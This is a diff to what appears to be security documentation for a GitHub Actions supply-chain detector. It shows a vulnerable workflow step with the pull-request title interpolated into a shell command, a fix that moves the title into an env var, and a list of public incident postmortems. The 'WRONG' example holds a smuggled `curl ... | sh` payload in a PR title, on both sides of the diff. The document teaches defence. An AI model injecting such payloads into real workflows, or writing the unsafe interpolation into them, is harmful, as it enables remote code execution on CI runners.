@@ -141,7 +141,7 @@ The `yaml-run-injection` detector walks `jobs.*.steps.*.run` and only fires when
 **Fix recipe**: Move the value out of `${{ }}` into an `env:` var, then reference the env var from the shell — shell quoting now applies and command substitution doesn't fire:
 
 ```yaml
-# WRONG — RCE if the PR title is `$(curl evil.sh | sh)`
+# WRONG — RCE if the PR title is `$(curl https://example.invalid/x | sh)`
 - run: echo "Building PR ${{ github.event.pull_request.title }}"
 
 # RIGHT — the env var is bash-quoted, no expression substitution
@@ -700,8 +700,8 @@ Verify each flag against the manager you actually run: `--ignore-scripts` is the
 
 The catalog draws on these public postmortems. Every vector in
 [why-these-ten.md](why-these-ten.md) cites its incidents from this list —
-"Source for" names only patterns that are still in the catalog (the descope's
-removed patterns are cited in the maintainer archive instead).
+"Source for" names only patterns that are still in the catalog; incidents that
+motivated removed patterns are not cited here.
 
 - **TanStack npm supply-chain compromise (2026-05-11)** — [postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem). Three-leg chain: untrusted trigger → cache poisoning via composite action → over-broad OIDC mint. Source for P14.7 and P14.9.
 - **Nesbitt 2026-04-28 systemic incident survey** — ["GitHub Actions is the weakest link"](https://nesbitt.io/2026/04/28/github-actions-is-the-weakest-link.html). Traces eighteen months of public Actions supply-chain incidents to a small set of platform features. Source for P14.10 and P14.11.
